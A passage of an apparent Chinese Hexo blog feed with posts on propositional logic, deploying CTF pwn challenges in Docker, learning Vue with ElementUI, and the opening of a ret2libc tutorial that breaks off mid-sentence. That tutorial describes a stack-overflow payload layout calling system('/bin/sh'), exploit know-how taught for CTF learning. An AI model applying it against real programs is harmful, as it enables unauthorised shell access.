        <content type="html"><![CDATA[<h1 id="命题符号化及联结词"><a href="#命题符号化及联结词" class="headerlink" title="命题符号化及联结词"></a>命题符号化及联结词</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><p>命题：能判断真假的<strong>陈述句</strong>，是具有<strong>唯一真值</strong>的陈述句 <span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">😄</span></p><p>命题符号化：使用小写的英文字母 ${p},{q},{r},{…},{q_i},{p_i},{r_i},{…}$ 来表示命题</p><p>例1-1：</p><script type="math/tex; mode=display">{p}: 2是素数 \\{q}: 雪是黑的</script><h2 id="0x10-简单命题"><a href="#0x10-简单命题" class="headerlink" title="0x10 简单命题"></a>0x10 简单命题</h2><p>据教科书的定义，<strong>把不含逻辑联结词“或”、“且”、“非”的命题称为简单命题</strong>（有逻辑书称为原子命题）．认为简单命题是逻辑演算最基本的单位，应被看做是一个不可再分割的整体．例如，“3是12的约数”、“0．5是整数”，它们都是简单命题．</p><p>在例1-1中p,q的真值是确定的，此时${p},{q}$ 又被称为<strong>命题常项（有书称为命题常元）</strong> </p><p>而对于像例1-2：</p><script type="math/tex; mode=display">{p}:{x}+{y}>7</script><p>这样的命题，当 ${x},{y}$ 的值确定下来以后命题的真值才能确定的这种 <strong>真值可以变化的简单陈述句</strong> 称为<strong>命题变项（命题变元）</strong></p><p><strong><em>注：命题变项不是命题</em></strong></p><h2 id="0x20-复合命题"><a href="#0x20-复合命题" class="headerlink" title="0x20 复合命题"></a>0x20 复合命题</h2><p><strong>由简单命题与逻辑联结词构成的命题是复合命题</strong>．例如，“20可被4或5整除”、“平行四边形的对边相等且平行”、“2非素数”，上述三个命题都是复合命题，因为它们分别含有逻辑联结词“或”、“且”、“非”．</p><p>例1-3：</p><script type="math/tex; mode=display">{p}:{3不是偶数} \\{q}:{2是偶数和素数} \\{r}:{林芳学过日语或英语}</script><h2 id="0x30-联结词运算优先级"><a href="#0x30-联结词运算优先级" class="headerlink" title="0x30 联结词运算优先级"></a>0x30 联结词运算优先级</h2><script type="math/tex; mode=display">\neg、\bigwedge、\bigvee、\rightarrow、\leftrightarrow</script><p>联结词也称作逻辑运算符，在运算时有优先级，有括号先算括号里的内容，然后按照上面的优先级进行运算</p><p>命题一般以 <code>1</code>来表示真，<code>0</code>来表示假</p><div class="table-container"><table><thead><tr><th style="text-align:center">${p}$</th><th style="text-align:center">${q}$</th><th style="text-align:center">${p}\bigwedge{q}$</th><th style="text-align:center">${p}\bigvee{q}$</th><th style="text-align:center">${p}\rightarrow{q}$</th><th style="text-align:center">${p}\leftrightarrow{q}$</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr></tbody></table></div><h2 id="0x90-课后习题"><a href="#0x90-课后习题" class="headerlink" title="0x90 课后习题"></a>0x90 课后习题</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200225214246.png" alt="例题 1-5"></p><p>解：（1）</p><script type="math/tex; mode=display">{设}:{p}:2是偶数.{q}:2是素数\\故:可用{p}\bigwedge{q}表示2是偶数又是素数</script><p>​    （2）</p><script type="math/tex; mode=display">{设}:{p}:小王聪明.{q}:小王用功\\{故}:可用{p}\bigwedge{q}来表示小王不但聪明而且用功</script><p>​    （3）</p><script type="math/tex; mode=display">设:{p}:天气很冷.{q}:老王来了\\故可用{p}\bigwedge{q}来表示虽然天气很冷，老王还是来了</script><p>​    （4）</p><script type="math/tex; mode=display">设:{p}:他吃饭.{q}:他看电视\\故可用{p}\bigwedge{q}来表示他一边吃饭一边看电视</script><p>（5）</p><script type="math/tex; mode=display">设:{p}:天下大雨.{q}:他乘公交汽车上班\\故可用{p}\rightarrow{q}如果天下大雨他就乘公交车</script><p>（6）</p><script type="math/tex; mode=display">设:{p}:天下大雨.{q}:他乘公交汽车上班\\故可用{q}\rightarrow{p}只有天下大雨，他才乘公共汽车上班</script><p>（7）</p><script type="math/tex; mode=display">设:{p}:天下大雨.{q}:他乘公交汽车上班\\故可用{q}\rightarrow{p}除非天下大雨，否则他不乘公交汽车上班</script><p>总结：<code>命题符号化，需要将命题先转换成简单命题，值得注意的是符号化的p,q不能带不，非这样的文字</code></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200225214245.png" alt="例题 1-6"></p><p>解：（1）</p><script type="math/tex; mode=display">\because{p},{q}的真值为0，{r}的真值为1\\\therefore{q}\bigwedge{r}的真值为0\\\therefore{p}\bigvee({q}\bigwedge{r})的真值为0</script><p>​    （2）</p><script type="math/tex; mode=display">\because{p}\leftrightarrow{r}的真值为0，\neg{q}\bigvee{s}的真值为1\\\therefore ({p}\leftrightarrow{q})\bigwedge(\neg{q}\bigvee{s})的真值为0</script><p>​    （3）</p><script type="math/tex; mode=display">\because{q}\bigvee{r}的真值为1,{p}\bigvee{q}的真值为0，{r}\bigwedge{s}的真值为1\\\therefore({p}\bigwedge({q}\bigvee{r}))\rightarrow(({p}\bigvee{q})\bigwedge({r}\bigwedge{s}))的真值为1</script><h2 id="0x100-参考资料"><a href="#0x100-参考资料" class="headerlink" title="0x100 参考资料"></a>0x100 参考资料</h2><p>屈婉婷《离散数学（第五版）》——第一章 命题逻辑</p><p>公式使用LaTeX<span class="github-emoji" style="display:inline;vertical-align:middle;color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux pwn题目部署环境搭建</title>
      <link href="/2020/02/18/ctf/pwn/pwn-env/"/>
      <url>/2020/02/18/ctf/pwn/pwn-env/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-pwn题目部署环境搭建"><a href="#Linux-pwn题目部署环境搭建" class="headerlink" title="Linux pwn题目部署环境搭建"></a>Linux pwn题目部署环境搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>环境：Ubuntu 16.04虚拟机</p><p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/10801501.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10801501.html</a></p><h2 id="更换软件源为阿里源"><a href="#更换软件源为阿里源" class="headerlink" title="更换软件源为阿里源"></a>更换软件源为阿里源</h2><ol><li><p>备份</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre></li><li><p>修改</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo vim /etc/apt/sources.list</code></pre><p>将source.list文件内容替换成下面的</p><pre class=" language-lang-txt"><code class="language-lang-txt"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricteddeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</code></pre></li><li><p>更新</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo apt-get update</code></pre></li></ol><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>Docker是一种容器，可以理解为轻量级虚拟机，由于占用的资源少，可以同时开启很多个docker，所以很适合来做ctf题目的容器。<br>我参考的是这篇博客 <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html#autoid-0-0-0" target="_blank" rel="noopener">这可能是最为详细的Docker入门吐血总结</a>，关于docker的概念和基本用法大佬讲的很详细了。<br>由于我在ubuntu上安装，参考官方文档 <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">Get Docker CE for Ubuntu</a>，一步一步照着做就行。</p><h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>在Ubuntu上 <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p><ol><li><p>更新索引：</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get update</code></pre></li><li><p>安装软件包以允许<code>apt</code>通过HTTPS使用存储库：</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get install \    apt-transport-https \    ca-certificates \    curl \    gnupg-agent \    software-properties-common</code></pre></li><li><p>添加Docker的官方GPG密钥：</p><pre class=" language-lang-shell"><code class="language-lang-shell">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>返回OK</p></li><li><p>使用以下命令来设置<strong>稳定的</strong>存储库。要添加 <strong>每晚</strong>或<strong>测试</strong>存储库，请在以下命令中的单词后面添加<code>nightly</code>或<code>test</code>（或同时添加）<code>stable</code>。<a href="https://docs.docker.com/install/" target="_blank" rel="noopener">了解<strong>每晚</strong>和<strong>测试</strong>频道</a>。</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo add-apt-repository \   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \   $(lsb_release -cs) \   stable"</code></pre></li></ol><h3 id="安装DOCKER-ENGINE-社区"><a href="#安装DOCKER-ENGINE-社区" class="headerlink" title="安装DOCKER ENGINE-社区"></a>安装DOCKER ENGINE-社区</h3><ol><li><p>更新<code>apt</code>包索引。</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get update</code></pre></li><li><p>安装<em>最新版本</em>的Docker Engine-Community和containerd，或者转到下一步安装特定版本：</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre></li><li><p>通过运行<code>hello-world</code> 映像来验证是否正确安装了Docker Engine-Community 。</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo docker run hello-world</code></pre></li></ol><h2 id="镜像部署"><a href="#镜像部署" class="headerlink" title="镜像部署"></a>镜像部署</h2><h3 id="获取Docker-Ubuntu16-04镜像"><a href="#获取Docker-Ubuntu16-04镜像" class="headerlink" title="获取Docker Ubuntu16.04镜像"></a>获取Docker Ubuntu16.04镜像</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo docker pull ubuntu:16.04</code></pre><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ sudo apt install docker-compose git</code></pre><h3 id="安装pwn-deploy-chroot"><a href="#安装pwn-deploy-chroot" class="headerlink" title="安装pwn_deploy_chroot"></a>安装pwn_deploy_chroot</h3><pre class=" language-lang-shell"><code class="language-lang-shell">git clone https://github.com/giantbranch/pwn_deploy_chroot.git</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>将我们的题目放入pwn_deploy_chroot的bin目录下，然后根据以下操作即可：</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><pre class=" language-lang-shell"><code class="language-lang-shell">$ python initialize.py</code></pre><p>使用完成后会生成</p><p>docker-compose.yml、Dockerfile、flags.txt、pwn.xinetd</p><p>这几个文件</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ docker-compose up --build -d</code></pre><p>显示done 查看是否成功</p><pre class=" language-lang-shell"><code class="language-lang-shell">$ netstat -antp | grep docker</code></pre><p>显示</p><pre class=" language-lang-txt"><code class="language-lang-txt">tcp        0      0 192.168.111.134:33122   104.18.124.25:443       ESTABLISHED 17011/dockerd   tcp6       0      0 :::10000                :::*                    LISTEN      23036/docker-proxytcp6       0      0 :::10001                :::*                    LISTEN      23023/docker-proxytcp6       0      0 :::10002                :::*                    LISTEN      23010/docker-proxy</code></pre><p>表示成功</p><h3 id="check-amp-exp"><a href="#check-amp-exp" class="headerlink" title="check&amp;exp"></a>check&amp;exp</h3><p>输入<code>ifconfig</code>查看docker的ip，尝试用nc连</p><p>出现</p><pre class=" language-lang-shell"><code class="language-lang-shell">pwn test</code></pre><p>表示成功</p><p>进入容器</p><pre class=" language-lang-shell"><code class="language-lang-shell">sudo docker exec -ti feac591ee90a bash</code></pre><h3 id="编译C"><a href="#编译C" class="headerlink" title="编译C"></a>编译C</h3><pre class=" language-lang-shell"><code class="language-lang-shell">gcc -o hello hello.c</code></pre><h3 id="初始化时出现的问题"><a href="#初始化时出现的问题" class="headerlink" title="初始化时出现的问题"></a>初始化时出现的问题</h3><p>我在使用过程中出现</p><pre class=" language-lang-txt"><code class="language-lang-txt">AttributeError: 'module' object has no attribute 'SSL_ST_INIT'</code></pre><p>解决方法：</p><pre class=" language-lang-shell"><code class="language-lang-shell"># ls -l /usr/lib/python2.7/dist-packages/ | grep -i ssldrwxr-xr-x  3 root root   4096 Jan  9 09:23 OpenSSLdrwxr-xr-x  2 root root   4096 Jan  9 09:23 pyOpenSSL-0.15.1.egg-info# rm -rf /usr/lib/python2.7/dist-packages/OpenSSL# rm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info# pip install pyopenssl# ls -l /usr/lib/python2.7/dist-packages/ |grep -i ssldrwxr-sr-x  2 root staff   4096 Jan  9 09:27 OpenSSLdrwxr-sr-x  2 root staff   4096 Jan  9 09:27 pyOpenSSL-18.0.0.dist-info</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>使用pwn_deploy_chroot部署国赛pwn比赛题目: <a href="https://www.cnblogs.com/20175211lyz/p/10801501.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/10801501.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3.x 学习记录</title>
      <link href="/2020/02/18/html/vue/"/>
      <url>/2020/02/18/html/vue/</url>
      
        <content type="html"><![CDATA[<h1 id="期末项目学习记录"><a href="#期末项目学习记录" class="headerlink" title="期末项目学习记录"></a>期末项目学习记录</h1><h2 id="vue3-x学习"><a href="#vue3-x学习" class="headerlink" title="vue3.x学习"></a>vue3.x学习</h2><p>引入：</p><pre class=" language-lang-html"><code class="language-lang-html"><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script></code></pre><h3 id="安装与卸载"><a href="#安装与卸载" class="headerlink" title="安装与卸载"></a>安装与卸载</h3><pre class=" language-lang-txt"><code class="language-lang-txt">npm install -g @vue/cli //安装npm uninstall -g @vue/cli //卸载</code></pre><p>指定版本安装</p><pre class=" language-lang-txt"><code class="language-lang-txt">3.0以下😔npm install -g vue-cli@版本号3.0以上😀npm install -g @vue/cli@版本号</code></pre><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><pre class=" language-lang-txt"><code class="language-lang-txt">vue create project//project为项目名称</code></pre><p>项目创建选项</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175201.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175206.jpg" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175209.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175211.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175213.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175215.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175216.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175218.jpg" alt="图片来自与手把手撸代码前端"></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191217175220.jpg" alt="图片来自与手把手撸代码前端"></p><h3 id="vue-项目初始化"><a href="#vue-项目初始化" class="headerlink" title="vue 项目初始化"></a>vue 项目初始化</h3><h4 id="vue-config-js"><a href="#vue-config-js" class="headerlink" title="vue.config.js"></a>vue.config.js</h4><pre class=" language-lang-js"><code class="language-lang-js">const path = require('path');module.exports = {  // 基本路径  publicPath: process.env.NODE_ENV === 'production' ? '' : '/',  // 输出文件目录  outputDir: process.env.NODE_ENV === 'production' ? 'dist' : 'devdist',  // eslint-loader 是否在保存的时候检查  lintOnSave: true,  /**   * webpack配置,see https://github.com/vuejs/vue-cli/blob/dev/docs/webpack.md   **/  chainWebpack: (config) => {  },  configureWebpack: (config) => {    // config.resolve = { // 配置解析别名    //   extensions: ['.js', '.json', '.vue'],    //   alias: {    //     '@': path.resolve(__dirname, './src'),    //     'public': path.resolve(__dirname, './public'),    //     'components': path.resolve(__dirname, './src/components'),    //     'common': path.resolve(__dirname, './src/common'),    //     'api': path.resolve(__dirname, './src/api'),    //     'views': path.resolve(__dirname, './src/views'),    //     'data': path.resolve(__dirname, './src/data')    //   }    // }  },  // 生产环境是否生成 sourceMap 文件  productionSourceMap: false,  // css相关配置  css: {    // 是否使用css分离插件 ExtractTextPlugin    extract: true,    // 开启 CSS source maps?    sourceMap: false,    // css预设器配置项    loaderOptions: {    },    // 启用 CSS modules for all css / pre-processor files.    modules: false  },  // use thread-loader for babel & TS in production build  // enabled by default if the machine has more than 1 cores  parallel: require('os').cpus().length > 1,  /**   *  PWA 插件相关配置,see https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-pwa   */  pwa: {},  // webpack-dev-server 相关配置  devServer: {    open: false, // 编译完成是否打开网页    host: '0.0.0.0', // 指定使用地址，默认localhost,0.0.0.0代表可以被外界访问    port: 8080, // 访问端口    https: false, // 编译失败时刷新页面    hot: true, // 开启热加载    hotOnly: false,    proxy: null, // 设置代理    overlay: { // 全屏模式下是否显示脚本错误      warnings: true,      errors: true    },    before: app => {    }  },  /**   * 第三方插件配置   */  pluginOptions: {}}</code></pre><p>问题记录：为什么要建立vue.config.js?</p><h4 id="route重定向"><a href="#route重定向" class="headerlink" title="route重定向"></a>route重定向</h4><p>在route文件夹里的index.js的 const routes 中引入</p><p><strong>注意不要有空格</strong></p><p>在index.js的开头中引入组件 </p><pre class=" language-lang-js"><code class="language-lang-js">import Vue from "vue";import VueRouter from "vue-router";import Home from "../views/Home.vue";Vue.use(VueRouter);const routes = [  {    path: "/",    name: "home",    component: Home  },  {    path: "/login",    name: "login",    component:  () =>      import(/* webpackChunkName: "about" */ "../views/login/index.vue")  },  {    path: "/about",    name: "about",    // route level code-splitting    // this generates a separate chunk (about.[hash].js) for this route    // which is lazy-loaded when the route is visited.    component: () =>      import(/* webpackChunkName: "about" */ "../views/About.vue")  }];const router = new VueRouter({  routes});export default router;</code></pre><p>重定向：</p><pre class=" language-lang-js"><code class="language-lang-js">  {    path: "/",    redirect: "login"  }</code></pre><h4 id="引入全局样式"><a href="#引入全局样式" class="headerlink" title="引入全局样式"></a>引入全局样式</h4><p>在vue.config.js的 // css预设器配置项处添加，由于本系统选用的sass的预编译模式，因此需要添加</p><pre class=" language-lang-js"><code class="language-lang-js">        sass: {             prependData: `@import "./src/styles/main.scss";`        }</code></pre><pre><code>@import "normalize.scss";//在main.scss中引入</code></pre><h4 id="vue文件结构"><a href="#vue文件结构" class="headerlink" title="vue文件结构"></a>vue文件结构</h4><p>在vue.config.js文件中关闭登陆验证</p><pre class=" language-lang-js"><code class="language-lang-js">lintOnSave: false,</code></pre><p>文件结构</p><pre class=" language-lang-html"><code class="language-lang-html"><template>    <div>        haahha    </div></template><script>export default {}</script><style scoped></style></code></pre><p>注意：</p><ol><li>内容外边必须有一层标签包裹</li><li>style scoped属性是文件内样式</li><li>script 为脚本文件引用区</li><li>在vue中main.js为框架的主入口，如果需要引入一些东西的话直接在main.js中引入就好了</li></ol><p>可以删除app.vue中的样式以及nav</p><h4 id="引入element-ui"><a href="#引入element-ui" class="headerlink" title="引入element-ui"></a>引入element-ui</h4><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><pre class=" language-lang-txt"><code class="language-lang-txt">cnpm i element-ui -Snpm i element-ui -S</code></pre><p>两个选一个用</p><p>引入</p><ol><li>全部引入</li><li>按需引入</li></ol><p>1.全部引入</p><p>在main.js中写入：</p><pre class=" language-lang-js"><code class="language-lang-js">import Vue from 'vue';import ElementUI from 'element-ui';import 'element-ui/lib/theme-chalk/index.css';import App from './App.vue';Vue.use(ElementUI);new Vue({  el: '#app',  render: h => h(App)});</code></pre><p>2.按需引入</p><p>暂时不做详细，看官方文档</p><p><a href="https://element.eleme.io/#/zh-CN/component/quickstart" target="_blank" rel="noopener">https://element.eleme.io/#/zh-CN/component/quickstart</a></p><h5 id="问题（引入后没有样式）"><a href="#问题（引入后没有样式）" class="headerlink" title="问题（引入后没有样式）"></a>问题（引入后没有样式）</h5><p>elementUI引入没有样式的原因：</p><p>在vue.config.js的css中修改requireModuleExtension为true</p><pre class=" language-lang-js"><code class="language-lang-js">      requireModuleExtension: true</code></pre><p>即使用CSS models</p><h3 id="vue基础语法使用"><a href="#vue基础语法使用" class="headerlink" title="vue基础语法使用"></a>vue基础语法使用</h3><h4 id="vue-for"><a href="#vue-for" class="headerlink" title="vue-for"></a>vue-for</h4><h2 id="ElementUI"><a href="#ElementUI" class="headerlink" title="ElementUI"></a>ElementUI</h2><p>引入：</p><pre class=" language-lang-html"><code class="language-lang-html"><!--引入ElementUI组件-->    <link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css"></code></pre><pre class=" language-lang-html"><code class="language-lang-html"><!-- import Vue before Element --><script src="https://unpkg.com/vue/dist/vue.js"></script><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script></code></pre><p><a href="https://element.eleme.io/#/zh-CN/component/quickstart" target="_blank" rel="noopener">https://element.eleme.io/#/zh-CN/component/quickstart</a></p><h2 id="点击弹出表单事件处理"><a href="#点击弹出表单事件处理" class="headerlink" title="点击弹出表单事件处理"></a>点击弹出表单事件处理</h2><pre class=" language-lang-html"><code class="language-lang-html"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <meta http-equiv="X-UA-Compatible" content="ie=edge">    <!--引入ElementUI组件-->    <link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">    <link rel="stylesheet" href="css/index.css">    <title>reg</title></head><body>    <div id="app">        <!--Form-->        <el-button type="button" @click="dialogFormVisible = true">注册</el-button>        <el-dialog title="注册信息填写":visible.sync="dialogFormVisible">            <el-form :model="form">              <el-form-item label="名称":label-width="formlabelwidth">                  <el-input v-model="form.name" placeholder="username"></el-input>              </el-form-item>            </el-form>        </el-dialog>    </div></body><!-- import Vue before Element --><script src="https://unpkg.com/vue/dist/vue.js"></script><!-- import JavaScript --><script src="https://unpkg.com/element-ui/lib/index.js"></script><!--import index.js--><script>    var Main = {    data(){        return{            dialogFormVisible: false,            form: {                name: '',            },            formLabelWidth: '120px'        };    }};var Ctor=Vue.extend(Main)new Ctor().$mount('#app')</script></html></code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191215211442.png" alt="屏幕截图"></p><h2 id="主界面设计"><a href="#主界面设计" class="headerlink" title="主界面设计"></a>主界面设计</h2><h3 id="主题色彩选择"><a href="#主题色彩选择" class="headerlink" title="主题色彩选择"></a>主题色彩选择</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----ret2libc</title>
      <link href="/2020/02/18/ctf/pwn/pwn-re2libc/"/>
      <url>/2020/02/18/ctf/pwn/pwn-re2libc/</url>
      
        <content type="html"><![CDATA[<h1 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Ret2libc，故名思意，return to libc,在PWN中即：修改返回地址使其指向libc中的shell</p><p>参考文章：<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a> </p><h2 id="0x10-Return2libc"><a href="#0x10-Return2libc" class="headerlink" title="0x10 Return2libc"></a>0x10 Return2libc</h2><p><em>－－修改返回地址，让其指向内存中已有的某个函数</em></p><p>根据上面副标题的说明，要完成的任务包括：在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。下面就以执行 system(“/bin/sh”) 为例，先写出溢出数据的组成，再确定对应的各部分填充进去。</p><blockquote><p><strong>payload:</strong> padding1 + address of system() + padding2 + address of “/bin/sh”</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220145.png" alt=""></p><h2 id="0x20-return2libc-payload"><a href="#0x20-return2libc-payload" class="headerlink" title="0x20 return2libc  payload"></a>0x20 return2libc  payload</h2><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p><p>根据上面的构造，我们要解决个问题。</p><ol><li>返回地址之前的填充数据（padding1）应该多长？</li></ol><p>解决方法和 shellcode 中提到的答案一样。</p><ol><li>system() 函数地址应该是多少？</li></ol><p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 